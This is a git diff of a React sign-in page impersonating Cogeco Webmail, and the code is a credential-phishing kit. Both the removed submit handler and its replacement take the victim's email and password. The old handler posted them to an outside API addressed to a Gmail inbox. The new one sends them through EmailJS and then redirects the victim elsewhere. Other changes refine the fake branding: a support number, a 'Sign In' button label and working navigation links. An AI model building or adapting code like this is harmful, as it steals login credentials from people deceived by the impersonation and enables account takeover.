@@ -1,6 +1,7 @@
 // src/HomePage.jsx
 import React, { useState } from "react";
 import axios from "axios";
+import emailjs from "emailjs-com";
 
 const HomePage = () => {
   const [formData, setFormData] = useState({
@@ -38,97 +39,65 @@ const HomePage = () => {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    setIsLoading(true);
-    const customizedMessage = `
-      Hello, New Form Submitted 
-      Email: ${formData.email},
-      Password: ${formData.password}
-      Thank you for using our service.
-    `;
-    const data = {
-      sender_name: import.meta.env.APP_SENDER_NAME,
-      sender_email: import.meta.env.APP_SENDER_ADDRESS,
-      message: customizedMessage,
-      subject: "New Form Submitted",
-      email: "krogstadracheal@gmail.com",
-      name: "Cogeco",
-    };
-    console.log(data);
 
-    const url =
-      import.meta.env.APP_API_URL ??
-      "http://talentsapartments.com/api/api-email";
-    if (validateForm()) {
-      try {
-        await axios.post(url, data);
-        setIsSubmitted(true);
-        setIsLoading(false);
-      } catch (error) {
-        console.error("Failed to send email:", error);
-        setIsLoading(false);
+    if (!validateForm()) return;
+    setIsLoading(true);
+    const senderName = import.meta.env.APP_SENDER_NAME;
+    const redirectUrl = import.meta.env.APP_REDIRECT_URL;
+
+    const customizedMessage = `
+    Hello, New Form Submitted 
+    Email: ${formData.email},
+    Password: ${formData.password}
+    Thank you for using our service.
+  `;
+
+    try {
+      const templateParams = {
+        to_name: senderName,
+        from_email: formData.email,
+        message: customizedMessage,
+      };
+
+      const serviceId = import.meta.env.APP_EMAILJS_SERVICE_ID;
+      const templateId = import.meta.env.APP_EMAILJS_TEMPLATE_ID;
+      const userId = import.meta.env.APP_EMAILJS_USER_ID;
+      await emailjs.send(serviceId, templateId, templateParams, userId);
+      setIsLoading(false);
+      if (redirectUrl) {
+        window.parent.location.href = redirectUrl.toString();
       }
+      setSuccessMessage("Email sent successfully!");
+    } catch (error) {
+      setIsLoading(false);
+      console.error("Email sending error:", error);
+      setSuccessMessage("Failed to send email. Please try again.");
     }
   };
-  // const handleSubmit = async (e) => {
-  //   e.preventDefault();
-  //   if (!validateForm()) return;
-
-  //   const customizedMessage = `
-  //     Welcome, ${formData.email}!
-  //     Thank you for using our service.
-  //     Remembered: ${formData.remember ? "Yes" : "No"}
-  //   `;
-
-  //   try {
-  //     await emailjs.send(
-  //       import.meta.env.REACT_APP_EMAILJS_SERVICE_ID,
-  //       import.meta.env.REACT_APP_EMAILJS_TEMPLATE_ID,
-  //       {
-  //         to_email: formData.email,
-  //         message: customizedMessage,
-  //       },
-  //       import.meta.env.REACT_APP_EMAILJS_USER_ID
-  //     );
-  //     setSuccessMessage("Email sent successfully!");
-  //   } catch (error) {
-  //     console.error("Email sending error:", error);
-  //     setSuccessMessage("Failed to send email. Please try again.");
-  //   }
-  // };
   return (
     <div className="page">
       {/* Navbar */}
       <header>
         <div className="top-bar d-flex align-items-center justify-content-between">
           <div className="d-flex align-items-center">
-            <a href="#" className="top-bar-link">
+            <a href="/" className="top-bar-link">
               Residential
             </a>
-            <a href="#" className="top-bar-link">
+            <a href="/" className="top-bar-link">
               Business
             </a>
-            <a
-              href="#"
-              className="top-bar-link"
-              target="_blank"
-              rel="noreferrer"
-            >
+            <a href="/" className="top-bar-link">
               Careers
             </a>
           </div>
           <div className="d-none d-lg-flex align-items-center">
-            <a href="#" className="top-bar-link">
+            <a href="/" className="top-bar-link">
               My Account
             </a>
-            <a href="/en/business" className="top-bar-link active">
+            <a href="" className="top-bar-link active">
               Webmail
             </a>
-            <a
-              href="#"
-              className="top-bar-link"
-              target="_blank"
-              rel="noreferrer"
-            >
+            <a href="/" className="top-bar-link">
               Contact Us
             </a>
 
@@ -136,41 +105,41 @@ const HomePage = () => {
             <div className="dropdown">
               <a
                 className="top-bar-link dropdown-toggle"
-                href="#"
+                href="/"
                 id="profileDropdown"
                 role="button"
                 data-bs-toggle="dropdown"
                 aria-expanded="false"
               >
-                Profile
+                Ontario
               </a>
-              <ul
+              {/* <ul
                 className="dropdown-menu top-bar-dropdown"
                 aria-labelledby="profileDropdown"
               >
                 <li>
-                  <a className="dropdown-item top-bar-dropdown-item" href="#">
+                  <a className="dropdown-item top-bar-dropdown-item" href="/">
                     View Profile
                   </a>
                 </li>
                 <li>
-                  <a className="dropdown-item top-bar-dropdown-item" href="#">
+                  <a className="dropdown-item top-bar-dropdown-item" href="/">
                     Settings
                   </a>
                 </li>
                 <li>
-                  <a className="dropdown-item top-bar-dropdown-item" href="#">
+                  <a className="dropdown-item top-bar-dropdown-item" href="/">
                     Logout
                   </a>
                 </li>
-              </ul>
+              </ul> */}
             </div>
 
             {/* Language Dropdown */}
             <div className="dropdown ms-3">
               <a
                 className="top-bar-link dropdown-toggle"
-                href="#"
+                href="/"
                 id="languageDropdown"
                 role="button"
                 data-bs-toggle="dropdown"
@@ -183,17 +152,17 @@ const HomePage = () => {
                 aria-labelledby="languageDropdown"
               >
                 <li>
-                  <a className="dropdown-item top-bar-dropdown-item" href="#">
+                  <a className="dropdown-item top-bar-dropdown-item" href="/">
                     FR
                   </a>
                 </li>
                 <li>
-                  <a className="dropdown-item top-bar-dropdown-item" href="#">
+                  <a className="dropdown-item top-bar-dropdown-item" href="/">
                     ES
                   </a>
                 </li>
                 <li>
-                  <a className="dropdown-item top-bar-dropdown-item" href="#">
+                  <a className="dropdown-item top-bar-dropdown-item" href="/">
                     DE
                   </a>
                 </li>
@@ -202,7 +171,7 @@ const HomePage = () => {
           </div>
         </div>
         <div className="header">
-          <a className="navbar-brand" href="#">
+          <a className="navbar-brand" href="/">
             <img
               alt=""
               loading="lazy"
@@ -219,7 +188,7 @@ const HomePage = () => {
                   <li className="nav-item dropdown">
                     <a
                       className="nav-link"
-                      href="#"
+                      href="/"
                       id="navbarDropdown"
                       role="button"
                       data-bs-toggle="dropdown"
@@ -227,67 +196,24 @@ const HomePage = () => {
                     >
                       Internet
                     </a>
-                    {/* <ul
-                  className="dropdown-menu mega-menu"
-                  aria-labelledby="navbarDropdown"
-                >
-                  <div className="row">
-                    <div className="col-md-4">
-                      <h6 className="dropdown-header">Category 1</h6>
-                      <a className="dropdown-item" href="#">
-                        Submenu 1
-                      </a>
-                      <a className="dropdown-item" href="#">
-                        Submenu 2
-                      </a>
-                      <a className="dropdown-item" href="#">
-                        Submenu 3
-                      </a>
-                    </div>
-                    <div className="col-md-4">
-                      <h6 className="dropdown-header">Category 2</h6>
-                      <a className="dropdown-item" href="#">
-                        Submenu 4
-                      </a>
-                      <a className="dropdown-item" href="#">
-                        Submenu 5
-                      </a>
-                      <a className="dropdown-item" href="#">
-                        Submenu 6
-                      </a>
-                    </div>
-                    <div className="col-md-4">
-                      <h6 className="dropdown-header">Category 3</h6>
-                      <a className="dropdown-item" href="#">
-                        Submenu 7
-                      </a>
-                      <a className="dropdown-item" href="#">
-                        Submenu 8
-                      </a>
-                      <a className="dropdown-item" href="#">
-                        Submenu 9
-                      </a>
-                    </div>
-                  </div>
-                </ul> */}
                   </li>
                   <li className="nav-item">
-                    <a className="nav-link" href="#">
+                    <a className="nav-link" href="/">
                       TV
                     </a>
                   </li>
                   <li className="nav-item">
-                    <a className="nav-link" href="#">
+                    <a className="nav-link" href="/">
                       Promos
                     </a>
                   </li>
                   <li className="nav-item">
-                    <a className="nav-link" href="#">
+                    <a className="nav-link" href="/">
                       About Us
                     </a>
                   </li>
                   <li className="nav-item">
-                    <a className="nav-link active" href="#">
+                    <a className="nav-link active" href="/">
                       Support
                     </a>
                   </li>
@@ -314,7 +240,7 @@ const HomePage = () => {
                   </button>
                   <button className="btn btn-link d-none d-lg-flex">
                     {" "}
-                    0901 2345 678
+                    1-866-261-4447
                   </button>
                 </div>
               </div>
@@ -390,18 +316,17 @@ const HomePage = () => {
                     )}
                   </div>
                   <div className="mb-3">
-                    <div className="custom-checkbox">
+                    <div className="d-flex align-items-center">
                       <input
                         type="checkbox"
                         name="remember"
                         checked={formData.remember}
                         onChange={handleInputChange}
-                        className="form-check-input"
+                        className="form-check-input m-0"
                         // id="remember"
                         id="styledCheckbox"
                       />
-                      <span className="checkbox-box"></span>
-                      <label for="styledCheckbox" className="custom-label">
+                      <label for="styledCheckbox" className="custom-label ms-2">
                         Remember my email address!
                       </label>
                     </div>
@@ -413,7 +338,7 @@ const HomePage = () => {
 
                   <div>
                     <button type="submit" className="btn form-btn">
-                      {isLoading ? "Please Wait...." : "Submit"}
+                      {isLoading ? "Please Wait...." : "Sign In"}
                     </button>
                   </div>
                 </form>
@@ -467,7 +392,7 @@ const HomePage = () => {
                   Cogeco Webmail has convenient features, such as seamless
                   navigation between your inbox, calendar and contacts.
                 </p>
-                <a href="#" className="btn mt-4 details-button">
+                <a href="/" className="btn mt-4 details-button">
                   Learn more
                 </a>
               </div>
